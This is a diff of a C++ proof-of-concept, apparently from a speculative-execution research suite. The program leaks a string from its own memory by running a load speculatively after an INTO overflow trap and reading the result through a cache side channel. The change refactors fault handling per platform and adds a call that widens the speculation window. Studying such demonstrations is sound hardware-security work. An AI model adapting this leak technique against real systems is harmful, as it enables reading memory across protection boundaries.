@@ -14,8 +14,8 @@
  * demonstrated on X64 or AMD64.
  * We cause the overflow trap by making the OF flag in EFLAGS being set.
  * Afterwards we yield the INTO instruction and fetch from the address. Even
- * though the INTO instruction triggers OF (which is ensured by the dead code
- * guard), the next load is speculatively performed.
+ * though the INTO instruction triggers OF, the next load is speculatively
+ * performed.
  **/
 
 #include "compiler_specifics.h"
@@ -28,17 +28,25 @@
 #  error Unsupported architecture. IA32 required.
 #endif
 
+#include <signal.h>
+
 #include <array>
 #include <climits>
 #include <cstring>
 #include <iostream>
 
-#include <signal.h>
-
 #include "cache_sidechannel.h"
 #include "instr.h"
-#include "meltdown_local_content.h"
+#include "faults.h"
 #include "local_content.h"
+#include "utils.h"
+
+// Different platforms raise different signals in response to the OF trap.
+#if SAFESIDE_LINUX
+constexpr int kOverflowSignal = SIGSEGV;
+#elif SAFESIDE_MAC
+constexpr int kOverflowSignal = SIGFPE;
+#endif
 
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
@@ -60,25 +68,19 @@ static char LeakByte(const char *data, size_t offset) {
 
       bool firstbit = reinterpret_cast<ptrdiff_t>(unsafe_address) & 0x80000000;
       int shift = INT_MAX - 2 * firstbit * INT_MAX;
-      // This crashes by the OF trap being raised.
-      SupposedlySafeOffsetAndDereference(unsafe_address + shift, -shift);
 
-      std::cout << "Dead code. Must not be printed." << std::endl;
+      bool handled_fault = RunWithFaultHandler(kOverflowSignal, [&]() {
+        // Delay retirement of OF trap.
+        ExtendSpeculationWindow();
 
-      // The exit call must not be unconditional, otherwise clang would
-      // optimize out everything that follows it and the linking would fail.
-      if (strlen(public_data) != 0) {
+        // This crashes by the OF trap being raised.
+        SupposedlySafeOffsetAndDereference(unsafe_address + shift, -shift);
+      });
+
+      if (!handled_fault) {
+        std::cerr << "Read didn't yield expected fault" << std::endl;
         exit(EXIT_FAILURE);
       }
-
-      // SIGSEGV signal handler moves the instruction pointer to this label.
-#if SAFESIDE_LINUX
-      asm volatile("afterspeculation:");
-#elif SAFESIDE_MAC
-      asm volatile("_afterspeculation:");
-#else
-#  error Unsupported OS.
-#endif
     }
 
     std::pair<bool, char> result =
@@ -96,13 +98,6 @@ static char LeakByte(const char *data, size_t offset) {
 }
 
 int main() {
-#if SAFESIDE_LINUX
-  OnSignalMoveRipToAfterspeculation(SIGSEGV);
-#elif SAFESIDE_MAC
-  OnSignalMoveRipToAfterspeculation(SIGFPE);
-#else
-#  error Unsupported OS.
-#endif
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset = private_data - public_data;
